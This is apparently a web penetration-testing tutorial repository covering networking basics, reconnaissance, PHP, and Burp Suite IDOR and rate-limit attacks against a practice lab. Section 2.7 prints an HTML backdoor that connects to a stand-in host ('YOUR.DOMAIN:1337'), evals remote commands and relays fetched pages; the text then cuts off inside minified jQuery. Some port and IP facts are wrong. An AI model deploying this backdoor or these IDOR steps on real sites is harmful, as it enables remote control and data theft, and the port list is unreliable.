#
# Hacking Web
## Contents
## 1.  [ Basics of web penetration testing ](hacking.Web#1.0).
### 1.1 [  Types of Hacking ](hacking.Web#1.1)
### 1.2 [ Report ](hacking.Web#1.2)
### 1.3 [ Black hat ](hacking.Web#1.3)
### 1.4 [ White hat ](hacking.Web#1.4)
### 1.5 [  Testing on level of assistance ](hacking.Web#1.5)
### 1.6 [  Security Experts ](hacking.Web#1.6)
### 1.7 [ Computer networks  ](hacking.Web#1.7)
### 1.8 [ Client-server-model ](hacking.Web#1.8)
### 1.9 [  IP address ](hacking.Web#1.9)
### 1.10 [  IP address Versions ](hacking.Web#1.10)
### 1.11 [ Internal and External IP ](hacking.Web#1.11)
### 1.12 [  NAT ](hacking.Web#1.12)
### 1.13 [  IP Range ](hacking.Web#1.13)
### 1.14 [ Tool  ](hacking.Web#1.14)
### 1.15 [  DNS Domain Name System ](hacking.Web#1.15)
### 1.16 [ Exploitation ](hacking.Web#1.16)
### 1.17 [  OSI Model ](hacking.Web#1.17)
#
## 2. [  Domain information Gathering ](hacking.Web#2.0)
### 2.1 [ Information Gathering  ](hacking.Web#2.1)
### 2.2 [ Web Servers Architecture ](hacking.Web#2.2)
### 2.3 [  Basics of PhP ](hacking.Web#2.3)
### 2.4 [  GET vs POST ](hacking.Web#2.4)
### 2.5 [ Client side attacks  ](hacking.Web#2.5)
### 2.6 [ Exercise  ](hacking.Web#2.6)
### 2.7 [ Server side attack HTML Backdoor  ](hacking.Web#2.7)
#
## 3. [ XSS, Forced browsing and event listening ](hacking.Web#3.0)
### 3.1 [ Event listening ](hacking.Web#3.1)
### 3.2 [  XSS (Cross site scripting) ](hacking.Web#3.2)
### 3.3 [  Insecure Direct Object References (IDOR) ](hacking.Web#3.3)
### 3.4 [  Session cookie flaws ](hacking.Web#3.4)
### 3.5 [ CSRF Cross-site scripting request forgery ](hacking.Web#3.5)
### 3.6 [ Post based xss ](hacking.Web#3.6)
### 3.7 [ open redirection vulnerability ](hacking.Web#3.7)
#
## 4. [ Database injection and vulnerability assessment  ](hacking.Web#4.0)
### 4.1 [Vulnerability Explanation ](hacking.Web#4.1)
### 4.2 [ Testing ](hacking.Web#4.2)
### 4.3 [ Scanner configuration ](hacking.Web#4.3)
### 4.4 [ Standard SQL Injection Testing ](hacking.Web#4.4)
### 4.5 [ Boolean Exploitation Technique ](hacking.Web#4.5)
### 4.6 [ Error based Exploitation technique ](hacking.Web#4.6)
### 4.7 [  Out of band Exploitation technique](hacker.Web.md#4.7)
### 4.8 [  Time delay Exploitation technique ](hacker.Web.md#4.8)
### 4.9 [  Stored Procedure Injection ](hacker.Web.md#4.9)
### 4.10 [Automated Exploitation ](hacker.Web.md#4.10)
### 4.11 [ White Space ](hacker.Web.md#4.11)
### 4.12 [ Null Bytes ](hacker.Web.md#4.12)
### 4.13 [ Stack fingerprinting ](hacker.Web.md#4.13)
### 4.14 [ SQL Comments ](hacker.Web.md#4.14)
### 4.15 [ URL Encoding ](hacker.Web.md#4.15)
### 4.16 [ Character Encoding ](hacker.Web.md#4.16)
### 4.17 [ String Concatenation ](hacker.Web.md#4.17)
### 4.18 [ Hex Encoding ](hacker.Web.md#4.18)
### 4.19 [ Testing security methods ](hacker.Web.md#4.19)
### 4.20 [ GET based sqli ](hacker.Web.md#4.20)
#
## 5. [  Fingerprinting components ](hacking.Web#5.0)
### 5.1 [ Word press ](hacking.Web#5.1)
### 5.2 [  Drupal ](hacking.Web#5.2)
### 5.3 [  Network mapping ](hacking.Web#5.3)
### 5.4 [  Beware ](hacking.Web#5.4)
#
# <a name="1.0"></a>1. Basics of web penetration testing

In this complete repository I am going to discuss all about web application exploitation and vulnerability assessment. Most of the vulnerability we are going to encounter is OWASP top 10.

## <a name="1.1"></a>1.1 Types of Hacking

* Ethical hacking
    * Hacking which involved proper agreements to test the cyber infrastructure of organization or individual software.
    * Security professional are ethical
* Unethical hacking
    * Hacking that causes damage to an organization or individual is unethical. 

## <a name="1.2"></a>1.2 Report
* Reporting a vulnerability consist of two parts.
    * Security loopholes 
    * Solutions to loopholes

## <a name="1.3"></a>1.3 Black hat

*  Information Gathering
*  Vulnerability Assessment
*  Penetration testing and Gaining Access
*  Escalating privileges and gaining access
*  Clearing Tracks

# <a name="1.4"></a>1.4 White hat

* Legal Documentation       
    * Memorandum, Financial Agreement and Non Disclosure Agreement.
* Scope Assessment
    * What needs to be tested Admin dashboard(7 days), Test account(9 days), Code review(21 days)
* Information Assessment     
    * Client provides provide information about the system and expert analysis it.
* Vulnerability assessment   Finds all possible vulnerability and documents them. They use automated tools to find vulnerability.
* Penetration Testing	     Tries to exploit all the vulnerability and access the system and with respective POC.
* Gaining Access
* Escalating privileges
* Report Generation         
    * Includes vulnerabilities and POC's
* Patch Assistance	     
    Patching the vulnerability
* Revalidation		     
    Needs to cross-check whether the vulnerability is properly patched or not.

## <a name="1.5"></a>1.5 Testing on level of assistance

* White Box Testing
    * When security expert gets complete assistance from the organization. This includes Architecture, Demo Account, Source Code, Server Details

* Gray Box Testing 
    * when security expert gets partial assistance from the organization. Like Demo accounts, Server Details. This is preferred because it requires less effort and gives the minimal knowledge how a black hat can harm the organization.

* Black Box Testing - The security expert is given no assistance

## <a name="1.6"></a>1.6 Security Experts

* Internal testing- When security expert tests the application within the premises

* External testing- When security expert tests the application outside the premises

## <a name="1.7"></a>1.7 Computer networks

* When two devices are connected with each other.
* On the basis of geo coverage there are three types of networks
    * LAN WAN MAN
* On the basis of accessibility

* Internal network
    * Printer, computer is connected to the router. Isolated from public access

* External network
    * Internet is external network. Chatting on social network is part of external networks

## <a name="1.8"></a>1.8 Client-server-model

* All website data is stored on server. Server is a computer which sends information when required it is connected all the times.

    * `[]-client <---Request/Respond---> []-server`

* Data is sent in chunks to the clients which is called data packets. This is why images load slowly on slow network.

## <a name="1.9"></a>1.9 IP address

* Internet Protocol is a unique address assigned to a system within the internet. There are 4 numbers separated by dots.

## <a name="1.10"></a>1.10 IP address Versions
```bash
192.168.1.1   -- IPv4 its range is 0-255
A:B:C:D:E:F:G -- Each section consist of 4 hexadecimal digits. 0-9, a-f ,A-F
```

## <a name="1.11"></a>1.11 Internal and External IP

* IPv4 can be solved by using NAT (Network Address Translation). Example VMware. Address assigned within NAT are called Internal IP. Address assigned to the main system where the NAT is established is called External IP. 

## <a name="1.12"></a>1.12 NAT

* Translation of data and translating for internal network is called NAT.

## <a name="1.13"></a>1.13 IP Range

* The process of transferring and translating data between internal and external networks is called NAT (Network Address Translation)
* Now that we know about IP address, we must know that some IP address ranges are reserved for special usages. Here is a list:
    * For small internal networks (Like your home or small office): 192.168.0.0 to 192.168.255.55
    * For large internal networks (Like large MNCs, colleges, schools): 172.16.0.0 to 172.31.255.255
    * For massive internal networks (Like telecom networks, satellites): 10.0.0.0 to 10.255.255.255
    * 127.0.0.1 : This is called the LoopBack address and is used as the address of your own machine. (We will look at its uses later)

## <a name="1.14"></a>1.14 Check for your internal IP addresses using the steps given below.

* For Windows Users:
    * Click on the start menu and type cmd to open the command prompt.
    * Type ipconfig and press enter.
    * Your will see your Internal IP Address.

* For Linux/Mac OS users:
    * Open your "Terminal" (Ctrl/cmd + Alt + T).
    * Type ifconfig and press enter.
    * Your will see your Internal IP Address.

* To find the external IP address
    * Just search for ip address on google and to use these free websites to check your external IP address.
    * whatsmyip.com
    * ipchicken.com
    * ipcow.com

## <a name="1.15"></a>1.15 DNS Domain Name System

* A DNS or Domain Name System is a system of devices that help us find the corresponding IP address of a domain name. DNS is made up of series of servers. One server alone cannot store such massive information about so many domains and can not handle the millions of incoming requests per second

    * Parts of domain name
        * Example - drive.google.com.
            * The domain name is always accessed in a reverse order
            * Automatically added and called root domain name and stores this information in Root Name Server
            * .com 
                * Top Level Domain and is stored in TLD server
            * .co.in
                * .co is second level domain
            * .google 
                * Authoritative Name and Authoritative server stores the information about the main domain name.
            * drive 
                * This is called subdomain or host.
        * IP address of a default DNS is always static.

> There are 13 Root Name Servers across the world.


## <a name="1.16"></a>1.16 Ports

* Different information is transferred via separate ports to avoid the data packet collision
    * Types of ports
        * Hardware Ports- HDMI,USB,Audio,VGA gateway to interact with the hardware
        * Software Ports- Gateway to get inside the system and interact with the software.
        * Ports exist between 0-65535
* Each software ports has its own significance for example:

* Port No:

    * 47816 - For handling www requests
    * 1347  - Video files
    * 39735 - MP3 files
    * 80    - HTTP
    * 443   - HTTP's
    * 21    - FTP
    * 23    - Telnet
    * 25    - SMTP
    *  0-1023 		
        * Reserved for basic well known reserved services
    *  1024-49151 	
        * Reserved for some registered services
    *  49152-65535	
        * The range of temporary ports

    * Port on the sending device is called local port
    * Port on the receiving device is called remote port

* Data packets consist 4 type of information 

* ip address and 2-port number of the server.
* ip address and 4-port number of the client.

* Check open ports in system

* To check for open ports on a windows machine:
* Go to the start menu and type cmd.
* Right click on the command prompt and click on the ‘run as administrator’ option.
* Type 
    ```css 
        netstat -a | find /i "listening"
    ```
* You will see a list of all ports that are listening for a request.
* To check for open ports on a Mac OS:
* Open the terminal and run the following command.
    ```css
    netstat -an | grep LISTEN
    ```
* To check for open ports on a Linux machine:
    * Open the terminal and run the following command.
    ```css 
    netstat -lpnt
    ```

## <a name="1.7"></a>1.7 OSI Model

* So, we have seen the TCP/IP Model. Actually this was a derived model and is used today. But the original model on which the TCP/IP model was based, is called the OSI Model. This model has 7 layers, instead of 4 that we see in the TCP/IP model. The essential overall function of both the models remains the same, just that in the OSI model their work has been split into 7 layers.

* Now let us look at the function of each layer of the OSI model in detail.

* So, just like in the TCP/IP model, the data in the OSI model also passes from layer 7 to layer 1 at the sender’s end and from layer 1 to layer 7 at the receiver’s end.

* Application Layer- This layer provides an interactive interface for the user to enter and view data. One can give inputs in the form of text, audio, images, files, etc. The browser makes up the application layer.

* Presentation Layer- After the application layer, the data passes to the presentation layer. This is where the data is converted into computer friendly format, i.e in binary code. So, the presentation layer encodes the input, compresses it, and encrypts it if required. Then the data is sent to the next layer.

* Session Layer- This layer initiates a connection and creates a session, so that some context can be provided to the communication between the two devices.

* Transport Layer- This layer establishes an application level connectivity. For this, it attaches the source and destination port numbers.

* It also performs the task of error control, which means that it makes a checklist, so that it can be cross checked at the receiving end to ensure that all the data is transferred properly and not destroyed on the way. These checklists are known as checksums. 

* Network Layer- At the network layer, the source and destination IP addresses are attached, for the purpose of identification of devices, and to decide the virtual path that needs to be taken by the data packet. So, we can say that this layer does network level routing and pathing of packets.

* Data Link Layer- This layer attaches the source and destination MAC addresses, which are used to identify the hardware of the device. It also calculates checksums for error checking of the metadata that has been attached at all the previous layers, and also to manage the flow of data.

* Physical Layer- This is where the data is converted to hardware friendly signals, like radio signals, light signals, or electric signals, depending on the hardware that is being used for data transfer.

* This is the order in which the data passes at the sender’s end. At the receiver’s end, the order of the layers is reversed.

* Now, don’t worry if you cannot remember all this information. We have some simple tricks for you. A simple mnemonic that can used to remember the order of the layers from layer 7 to layer 1 is:

* All People Seem To Need Data Processing

* So that was all about the OSI model.
#
# <a name="2.0"></a>2. Domain information Gathering

## <a name="2.1"></a>2.1 Information Gathering 
* [Crunchbase](crunchbase.com) 
    * gathers all details of the business acquired by the organizations and mergers.
* Tools
    * Fierce
        * Finding subdomains
            * ```css 
                ./fierce/fierce.py --domain facebook.com
              ```
    * OWASP dir buster
        * Finding all filetypes inside the domain and 300 response we can search these files separately.

* Gathering information about people and organization

* Social network platforms api's
    * facebook
    * twitter
    * instagram
    * snapchat
    * pintrest
    * youtube
    * hangout
    * google+
    * professional platforms
    * LinkedIn
    * nakuri.com
    * glassdoor

* Here are some key pieces of information that a security expert usually gathers about a website:

    * Related domains and subdomains

        * Gathering technical, administrative, RAW Data.

            * [whois](whois.com/whois)

        * Domains hosted on the same web-server

           * [YouGetSingnal](yougetsignal.com/tools/web-sites-on-web-server/)
           * [DNS Dumpster](dnsdumpster.com)

    * Technology and programming languages being used

    * Cached pages

    * [Web Archive](web.archive.org)

* Website history
    * [Builtwith](builtwith.com)
    * [DNS-dumpster](dnsdumpster.com)

* Publicly indexed files on search engines

* Default pages and login forms

* Related IP addresses

* Other services running on those IP addresses

* Version of the services/software's being used

* Publicly disclosed vulnerabilities in the software's being used

* Default users

* Default passwords

* Valid email address and usernames

* Terms related to architecture of website

* Website 
* Webpages
* HTML
* Front end
* Back end

# <a name="2.2"></a>2.2 Web Servers Architecture


Web servers can be of various types. Each one has a specific function, and hence a specific configuration. Let us read about some of the most common web servers.

 * Application Server 
    *   This server executes the main business logic of the application. Whenever the user requests for something, the application server runs the code written by the developer. 

 * Database Server 
    * A database server is a system where all the data is stored. Whenever the user requests for some data, it is fetched from the database server. The data is stored here in an efficient and secure manner.

 * Backup Server 
    * This server helps us create backups for files, data, etc. This is done to prevent the loss of data in case of an unexpected failure. A backup server can also act like the secondary server, in case the primary server is down. 

 * DNS Server 
    * The Domain Name Server manages the domain names and their IP addresses. The main function of a DNS server is to map a domain name to its respective IP address. 

 * Mail Server
    * A mail server is used for sending and receiving emails. Some of the protocols used for this transfer are SMTP,POP, IMAP, etc. The Microsoft Exchange Server is an example of a mail server. 

* Depending on the size of the web application, all these servers can be present on one physical server or on separate servers. It is not necessary to have these as 5 different servers, but a combination of these can be present in one physical server, depending on the requirement of the application. Now, this server will have some architecture which should be appropriate for the kind of functions that the server will perform. 

* This architecture is called a web server architecture. It is made up of these 5 basic elements. Let’s look at each one of these. 
    * Server OS
        * Just like every computer has an operating system, similarly the computer that hosts the website also needs to have an OS.
        * Examples are Linux, Windows, IBM AIX, etc. 

    * Server Software 
        * We know that every website needs to address the incoming requests of the users. This request could be for a web page in the website, or for any other functionality that the website provides. For this, the server needs to run the code of the website to generate a response for the user. But, to handle all this function, the server needs a software which is called the server software. 
            * Examples are Apache, nginx, IIS, etc. 

     * Programming Language
        * Every website has a backend part which is basically written as lines of code, using a programming language. So, the web server architecture includes a particular programming language that is used to write this code. 

            * Examples are: PHP, Python, Perl, Ruby, ASP (.NET), JSP, etc. 

    * Database Software 
        * Every website has users and it stores the information of these users in the database. So your login credentials, your preferences, cart items in case of an e-commerce, or any other details that you provide while accessing a website is stored in the database in a secure and efficient manner. And to access this data from the database, a software is required. This is known as the database software. 

            * Examples are: MySQL, MS SQL, MongoDB, Casandra DB, Postgre SQL, etc. 

    * Front End Components
        * So, we know that every website has a frontend or a user interface, which is what the user sees on the browser while browsing through the website. So, there needs to be a front end language to write the front ends code. 

            * Examples are: HTML, javascript, Jquery, CSS, Bootstrap, etc. 

* Now, we know that the architecture will contain one of each of these elements. We will look at some of the most common combinations of web server architecture in the next lesson. 

* Some of the most common web server architecture combinations are: 

* (The front end component is not mentioned in any of these architecture combinations.)

    * WAMP
        * WAMP stands for Windows, Apache, MySQL, PHP. 

    * LAMP
        * LAMP stands for Linux, Apache, MySQL, PHP. It is one of the most frequently used combinations since all the components are available free of cost. 
    * MAMP
        * MAMP  stands for Mac, Apache, MySQL, PHP. It is most commonly used for web development and local testing processes by Mac OS based developers. 

    * XAMPP
        * Unlike other web server architectures, XAMPP can be used across any operating system. So the X in XAMPP stands for cross platform. The rest of it stands for Apache, MariaDB and PHP. 

    * WIMSA
        * It is the most commonly used Windows architecture. WIMSA stands for Windows, IIS, MS SQL, ASP.NET. 

* Some of the other non abbreviated web server architectures are:

    * Windows, tomcat, JSP, Postgre SQL

    * PHP, nginx, mongoDB

    * Python, nginx, mongoDB

* To give you a clear picture, the most commonly used OS is Linux. Apache is the most commonly used server software and PHP is the most commonly used server side programming language. 

* Misconceptions 
    * firewall, Intrusion detection system , Intrusion prevention system

## <a name="2.3"></a>2.3 Basics of PhP

* Add

    ```php
    $a=50;
    $b=90;
    echo $a+$b;

    Output: 140
    ```
* Subtract

    ```php
    $a=50;
    $b=90;
    echo $a-$b;

    Output: -40
    ```
* Product

    ```php
    $a=50;
    $b=90;
    echo $a*$b;

    Output: 4500
    ```

* Divide 
    ```php
    $a=5;
    $b=2;
    echo $a/$b;

    Output: 2.5
    ```

* Modulus (remainder)
    ```php
    $a=11;
    $b=2;
    echo $a%$b;

    Output: 1
    ```

* Exponential
    ```php
    $a=2;
    $b=3;
    echo $a**$b;

    Output: 8
    ```

* Concat (join)
    ```php
    $a=50;
    $b=90;
    echo $a.$b;

    Output: 5090
    ```
* You can also do complex arithmetic operations, like we do in maths.

    * An example is: 
    ```css 
        $a+($b+$c/($d**($a-$d))) 
    ```

* It follows the bodmas rule for solving the problem. Try out all these logical operators.

* us look at comparison operators. 

* The output for these operations is always true or false. 

* These are:
* Check if two values are equal
    * ```css 
      $a==$b 
      ```
    * More than
        ```css 
        $a>$b 
        ``` 
    * Less than
        ```css 
        $a<$b 
        ``` 
    * More than equal to
        ```css 
        $a>=$b 
        ``` 
    * Less than equal to
        ```css 
        $a<=$b 
        ``` 
    * Not equal
        ```css 
        $a!=$b 
        ``` 

* So in the first operator `($a==$b)`, if the value of variable ‘a’ is not equal to variable ‘b’, the output will be false. And if it is, the output will be true. 

* The same holds true for all these comparison operators. 

* Logical Operators

* Here is a list of some logical operators that can be used.

    * And
    * Or
    * Xor
    * || (or)
    * && (and)
    * ! (not)

## <a name="2.4"></a>2.4 GET vs POST

* GET requests are stored in the browser history, and it is not advice to store critical data in the browser history.

* GET requests can be used for relatively small data 2048 character as compared to POST which has theoretically no limit.

* GET requests cannot be used for all kinds of characters. We can only send Ascii characters using GET method , whereas POST method supports a variety of characters.

* File uploading cannot be done using GET. If you want an HTML form to upload files you have to use POST method.

## <a name="2.5"></a>2.5 Client side attacks 

## Steps to bypass Client side filters

* Enter correct data in input field.
* Let the client side validate the input.
* Intercept this data.
* Tamper and change the data.
* If there are no server side filter check, then the valid input will be accepted

## <a name="2.6"></a>2.6  Exercise

* Study about different kinds of encodings in web applications like URL encoding, Base64 encoding, hashing, etc.

* IDOR (Insecure Direct Object Reference)

    * check ?id, ?product etc .etc

* Example phone bill

    * Intercept request with Burp -call-history.php

    * Change phone_num=[target phone number]

    * Other number’s call history is shown

 * Rate limiting flaw

    * Numbers
        * `$` add this to the value
        * open burp suit 
        * send the request to the intruder
        * choose attack type
        * set payload

    * spam post

        * burpsuite
        * intercept the 
        * posted valueclear all
        * payload type = NULL
        * Generate = 100 or anything

* Example for posting on wall

    * Step 2: Open Burp Suite and turn the intercept on under the ‘proxy’ tab.
    * Step 3: Click on the delete icon (red color cross on the extreme left side) and intercept the request using Burp Suite.
    * Step 4: Now send this request to ‘repeater’ (use the shortcut ctrl+r on Burp Suite to send the request directly to Repeater) and change the intercepted User ID with the IDs given in the username of other users. Now click on the ‘Go’ button to forward the request.
    * Step 5: Now refresh the browser to view the changes. 

        * `Alpha numeric payload`

* Example Salary slip with id

    * Step 1. While making sure Burp Suite is configured in the browser, visit the IDOR in Beebox (The URL will be different for each user).
    * Step 2. Now click on the 'Generate Salary Slip' button and wait for the response. This request will be captured in Burp Suite.
    * Step 3. Now to view the request you just sent, open Burp Suite and go to the tab Proxy -> HTTP history.
    * Step 4. This HTTP history tab contains all the requests your browser has sent so far. Scroll down to the last few requests and notice the POST request you just made, it will have the EMP=EMP9D parameter which is the employee id. Click on it and the complete HTTP request will be displayed in the 'request' tab at the bottom.
    * Step 5. Now right click on this request and send it to Intruder.
    * Step 6: Now click on the Intruder tab, and click on the ‘Positions’ tab.
    Note: Make sure to clear all selected parameters first.
    * Step 7: Now from the parameter Emp=EMP9D, select the ‘9D’ part and click on the ’Add’ button.
    * Step 8: Select ‘Attack type’ as ‘Sniper’.
    * Step 9: Now click on ‘payloads’ tab.
    * Step 10: Under ‘payload options’ section, enter this character set:
    ABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210.
    Now set the Min and Max length to 2.
    * Step 11: Click on ‘Start Attack’.
    It will launch the attack and the intruder window will appear.
    Now sort the ‘length’ tab by double-clicking on the length tab, and wait till the attack is completed.
    The greater length value that comes under the ‘Length’ column is the desired request.
    * Step 12: Now once you find the right request, right click on the request and choose ‘show response in browser’ option to view the request in the browser. Copy the burp response URL and paste it in the burp configured browser.

 * Example Salary slip with download option

    * Step 1: Go to the hacking challenge in beebox select IDOR.
    * Step 2: Open Burp Suite and turn the intercept ON.
    * Step 3: Click on ‘Generate A/C statement for this month’ button and intercept the request.
    * Step 4: Send this request to Repeater (ctrl+r) and turn off the intercept.
    * Step 5: Now increment the account number value by adding 1 to the account number.
    * Step 6: Click on ‘Go’ button.
    * Step 7: Now right click on the ‘Response’ section and select ‘show response in browser’ option and copy the response URL. Then paste it in the same browser to view the response. 

* Example creating multiple accounts

    * Step 2: signup page. Enter the Email, Username, and Password.
    * Step 3: Now open Burp Suite and turn on the intercept.
    * Step 4: In the browser, click on the ‘Sign Up’ button and intercept the request.
    * Step 5: Now send this request to Intruder (ctrl+i)
    * Step 6: Under the Intruder tab, click on the ‘positions’ option and clear all selected request parameters.
    * Step 7: Now select the email and username fields.
    * Step 8: Choose the attack type as ‘Pitch Fork’.
    * Step 9: Now click on the ‘payloads’ tab and choose payload set 1.
    Also set Payload Type to ‘Simple List’.
    * Step 10: Now under ‘Payload Options’ add payloads manually. After each payload, click on the ‘Add’ button to add another payload. You need to enter 10 email IDs here.
    * Step 11: Now choose payload set 2.
    * Step 12: Repeat the same steps from step 9 to step 10 for Payload set 2.
    * Step 13: Click on ‘Start Attack’. 

## <a name="2.7"></a>2.7 Server side attack HTML Backdoor

```html
<div id="content"></div>

<script type="text/javascript">
var obj;
var content = document.getElementById('content');
var socket = new WebSocket('ws://YOUR.DOMAIN:1337');
socket.onopen = function () {
	socket.send(JSON.stringify({'req': 'hi'}));
	//socket.send('hello from the client');
};

function handleObj(obj)
{
	if (obj.request == 'eval')
		eval(obj.content);
	else if (obj.request == 'get')
		$.ajax({url: obj.url})
		.done(function(h) { socket.send(JSON.stringify({'request': 'getresponse', 'html': h})); console.log(h); });
}

socket.onmessage = function (message) {
	content.innerHTML += message.data +'<br />';
	try { obj = JSON.parse(message.data); } catch(e) { }
	if (typeof(obj) === 'object')
		handleObj(obj);
};

socket.onerror = function (error) {
	console.log('WebSocket error: ' + error);
};
</script>

<script>
/*! jQuery v2.2.2 | (c) jQuery Foundation | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error("jQuery requires a window with a document");return b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var c=[],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.toString,k=i.hasOwnProperty,l={},m="2.2.2",n=function(a,b){return new n.fn.init(a,b)},o=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,p=/^-ms-/,q=/-([\da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype={jquery:m,constructor:n,selector:"",length:0,toArray:function(){return e.call(this)},get:function(a){return null!=a?0>a?this[a+this.length]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.constructor(),a);return b.prevObject=this,b.context=this.context,b},each:function(a){return n.each(this,a)},map:function(a){return this.pushStack(n.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(e.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var b=this.length,c=+a+(0>a?b:0);return this.pushStack(c>=0&&b>c?[this[c]]:[])},end:function(){return this.prevObject||this.constructor()},push:g,sort:c.sort,splice:c.splice},n.extend=n.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for("boolean"==typeof g&&(j=g,g=arguments[h]||{},h++),"object"==typeof g||n.isFunction(g)||(g={}),h===i&&(g=this,h--);i>h;h++)if(null!=(a=arguments[h]))for(b in a)c=g[b],d=a[b],g!==d&&(j&&d&&(n.isPlainObject(d)||(e=n.isArray(d)))?(e?(e=!1,f=c&&n.isArray(c)?c:[]):f=c&&n.isPlainObject(c)?c:{},g[b]=n.extend(j,f,d)):void 0!==d&&(g[b]=d));return g},n.extend({expando:"jQuery"+(m+Math.random()).replace(/\D/g,""),isReady:!0,error:function(a){throw new Error(a)},noop:function(){},isFunction:function(a){return"function"===n.type(a)},isArray:Array.isArray,isWindow:function(a){return null!=a&&a===a.window},isNumeric:function(a){var b=a&&a.toString();return!n.isArray(a)&&b-parseFloat(b)+1>=0},isPlainObject:function(a){var b;if("object"!==n.type(a)||a.nodeType||n.isWindow(a))return!1;if(a.constructor&&!k.call(a,"constructor")&&!k.call(a.constructor.prototype||{},"isPrototypeOf"))return!1;for(b in a);return void 0===b||k.call(a,b)},isEmptyObject:function(a){var b;for(b in a)return!1;return!0},type:function(a){return null==a?a+"":"object"==typeof a||"function"==typeof a?i[j.call(a)]||"object":typeof a},globalEval:function(a){var b,c=eval;a=n.trim(a),a&&(1===a.indexOf("use strict")?(b=d.createElement("script"),b.text=a,d.head.appendChild(b).parentNode.removeChild(b)):c(a))},camelCase:function(a){return a.replace(p,"ms-").replace(q,r)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toLowerCase()===b.toLowerCase()},each:function(a,b){var c,d=0;if(s(a)){for(c=a.length;c>d;d++)if(b.call(a[d],d,a[d])===!1)break}else for(d in a)if(b.call(a[d],d,a[d])===!1)break;return a},trim:function(a){return null==a?"":(a+"").replace(o,"")},makeArray:function(a,b){var c=b||[];return null!=a&&(s(Object(a))?n.merge(c,"string"==typeof a?[a]:a):g.call(c,a)),c},inArray:function(a,b,c){return null==b?-1:h.call(b,a,c)},merge:function(a,b){for(var c=+b.length,d=0,e=a.length;c>d;d++)a[e++]=b[d];return a.length=e,a},grep:function(a,b,c){for(var d,e=[],f=0,g=a.length,h=!c;g>f;f++)d=!b(a[f],f),d!==h&&e.push(a[f]);return e},map:function(a,b,c){var d,e,g=0,h=[];if(s(a))for(d=a.length;d>g;g++)e=b(a[g],g,c),null!=e&&h.push(e);else for(g in a)e=b(a[g],g,c),null!=e&&h.push(e);return f.apply([],h)},guid:1,proxy:function(a,b){var c,d,f;return"string"==typeof b&&(c=a[b],b=a,a=c),n.isFunction(a)?(d=e.call(arguments,2),f=function(){return a.apply(b||this,d.concat(e.call(arguments)))},f.guid=a.guid=a.guid||n.guid++,f):void 0},now:Date.now,support:l}),"function"==typeof Symbol&&(n.fn[Symbol.iterator]=c[Symbol.iterator]),n.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(a,b){i["[object "+b+"]"]=b.toLowerCase()});function s(a){var b=!!a&&"length"in a&&a.length,c=n.type(a);return"function"===c||n.isWindow(a)?!1:"array"===c||0===b||"number"==typeof b&&b>0&&b-1 in a}var t=function(a){var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u="sizzle"+1*new Date,v=a.document,w=0,x=0,y=ga(),z=ga(),A=ga(),B=function(a,b){return a===b&&(l=!0),0},C=1<<31,D={}.hasOwnProperty,E=[],F=E.pop,G=E.push,H=E.push,I=E.slice,J=function(a,b){for(var c=0,d=a.length;d>c;c++)if(a[c]===b)return c;return-1},K="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",L="[\\x20\\t\\r\\n\\f]",M="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",N="\\["+L+"*("+M+")(?:"+L+"*([*^$|!~]?=)"+L+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+M+"))|)"+L+"*\\]",O=":("+M+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+N+")*)|.*)\\)|)",P=new RegExp(L+"+","g"),Q=new RegExp("^"+L+"+|((?:^|[^\\\\])(?:\\\\.)*)"+L+"+$","g"),R=new RegExp("^"+L+"*,"+L+"*"),S=new RegExp("^"+L+"*([>+~]|"+L+")"+L+"*"),T=new RegExp("="+L+"*([^\\]'\"]*?)"+L+"*\\]","g"),U=new RegExp(O),V=new RegExp("^"+M+"$"),W={ID:new RegExp("^#("+M+")"),CLASS:new RegExp("^\\.("+M+")"),TAG:new RegExp("^("+M+"|[*])"),ATTR:new RegExp("^"+N),PSEUDO:new RegExp("^"+O),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+L+"*(even|odd|(([+-]|)(\\d*)n|)"+L+"*(?:([+-]|)"+L+"*(\\d+)|))"+L+"*\\)|)","i"),bool:new RegExp("^(?:"+K+")$","i"),needsContext:new RegExp("^"+L+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+L+"*((?:-\\d)?\\d*)"+L+"*\\)|)(?=[^-]|$)","i")},X=/^(?:input|select|textarea|button)$/i,Y=/^h\d$/i,Z=/^[^{]+\{\s*\[native \w/,$=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,_=/[+~]/,aa=/'|\\/g,ba=new RegExp("\\\\([\\da-f]{1,6}"+L+"?|("+L+")|.)","ig"),ca=function(a,b,c){var d="0x"+b-65536;return d!==d||c?b:0>d?String.fromCharCode(d+65536):String.fromCharCode(d>>10|55296,1023&d|56320)},da=function(){m()};try{H.apply(E=I.call(v.childNodes),v.childNodes),E[v.childNodes.length].nodeType}catch(ea){H={apply:E.length?function(a,b){G.apply(a,I.call(b))}:function(a,b){var c=a.length,d=0;while(a[c++]=b[d++]);a.length=c-1}}}function fa(a,b,d,e){var f,h,j,k,l,o,r,s,w=b&&b.ownerDocument,x=b?b.nodeType:9;if(d=d||[],"string"!=typeof a||!a||1!==x&&9!==x&&11!==x)return d;if(!e&&((b?b.ownerDocument||b:v)!==n&&m(b),b=b||n,p)){if(11!==x&&(o=$.exec(a)))if(f=o[1]){if(9===x){if(!(j=b.getElementById(f)))return d;if(j.id===f)return 